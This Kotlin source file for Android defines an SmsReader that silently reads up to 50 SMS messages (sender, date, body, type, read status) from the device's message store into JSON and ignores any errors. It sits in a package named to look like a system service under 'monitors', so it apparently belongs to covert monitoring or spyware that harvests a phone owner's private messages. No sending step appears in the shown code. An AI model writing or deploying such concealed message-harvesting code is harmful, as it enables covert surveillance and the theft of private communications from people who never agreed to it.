package com.system.service.monitors

import android.content.Context
import android.net.Uri
import org.json.JSONArray
import org.json.JSONObject

object SmsReader {
    fun getSms(context: Context, limit: Int = 50): JSONArray {
        val result = JSONArray()
        val uri = Uri.parse("content://sms")
        val projection = arrayOf("address", "person", "date", "body", "type", "read")
        try {
            val cursor = context.contentResolver.query(
                uri, projection, null, null, "date DESC")
            cursor?.use {
                val colAddr = it.getColumnIndexOrThrow("address")
                val colDate = it.getColumnIndexOrThrow("date")
                val colBody = it.getColumnIndexOrThrow("body")
                val colType = it.getColumnIndexOrThrow("type")
                val colRead = it.getColumnIndexOrThrow("read")
                var count = 0
                while (it.moveToNext() && count < limit) {
                    val msgType = when (it.getInt(colType)) {
                        1    -> "inbox"
                        2    -> "sent"
                        3    -> "draft"
                        else -> "other"
                    }
                    result.put(JSONObject().apply {
                        put("from",   it.getString(colAddr) ?: "")
                        put("date",   it.getLong(colDate))
                        put("body",   it.getString(colBody) ?: "")
                        put("type",   msgType)
                        put("read",   it.getInt(colRead) == 1)
                    })
                    count++
                }
            }
        } catch (_: Exception) { }
        return result
    }
}
